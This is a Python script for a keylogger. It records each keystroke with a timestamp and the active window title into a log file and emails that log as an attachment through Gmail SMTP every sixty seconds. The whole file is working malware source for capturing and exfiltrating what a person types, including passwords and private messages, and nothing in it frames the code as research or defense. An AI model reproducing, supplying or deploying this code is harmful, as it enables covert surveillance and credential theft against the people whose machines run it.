import os
import smtplib
import subprocess
from datetime import datetime
from pynput import keyboard
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import socket

# Email setup
SENDER_EMAIL = "your_email@example.com"
SENDER_PASSWORD = "your_password"
RECIPIENT_EMAIL = "recipient_email@example.com"
EMAIL_INTERVAL = 60  # Time in seconds between email sends

# Log file setup
LOG_FILE_NAME = "keystrokes.log"

# Ensure the log file exists
if not os.path.exists(LOG_FILE_NAME):
    with open(LOG_FILE_NAME, "w") as log_file:
        log_file.write("Keystroke log initiated\n")

# Function to send log file as an email attachment
def email_log():
    try:
        # Check for internet connection
        if not is_connected():
            print("No internet connection. Email not sent.")
            return

        # Create the email message
        email_msg = MIMEMultipart()
        email_msg['From'] = SENDER_EMAIL
        email_msg['To'] = RECIPIENT_EMAIL
        email_msg['Subject'] = "Keystroke Log"

        # Attach the log file
        with open(LOG_FILE_NAME, "r") as log_file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(log_file.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f'attachment; filename={LOG_FILE_NAME}')
            email_msg.attach(attachment)

        # Send the email
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECIPIENT_EMAIL, email_msg.as_string())
            print(f"Email sent to {RECIPIENT_EMAIL}")

    except Exception as e:
        print(f"Error sending email: {e}")

# Function to check internet connectivity
def is_connected():
    try:
        # Connect to a well-known site to check internet connection
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

# Function to get the title of the active window
def get_active_window_title():
    try:
        result = subprocess.run(["xdotool", "getactivewindow", "getwindowname"], stdout=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except:
        return "Unknown Window"

# Function to log each keystroke
def log_keystroke(key):
    active_window = get_active_window_title()
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE_NAME, "a") as log_file:
        if hasattr(key, 'char') and key.char:
            log_file.write(f'[{current_time}] {active_window} {key.char}\n')
        else:
            log_file.write(f'[{current_time}] {active_window} {key}\n')
    print(f'[{current_time}] {active_window} {key}')

# Handle key press events
def on_key_press(key):
    log_keystroke(key)

# Handle key release events
def on_key_release(key):
    if key == keyboard.Key.esc:
        return False

# Schedule email sending
def schedule_email():
    email_log()
    Timer(EMAIL_INTERVAL, schedule_email).start()

# Start the keylogger and email scheduler
print("Keylogger started. Press 'Esc' to stop.")
schedule_email()
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
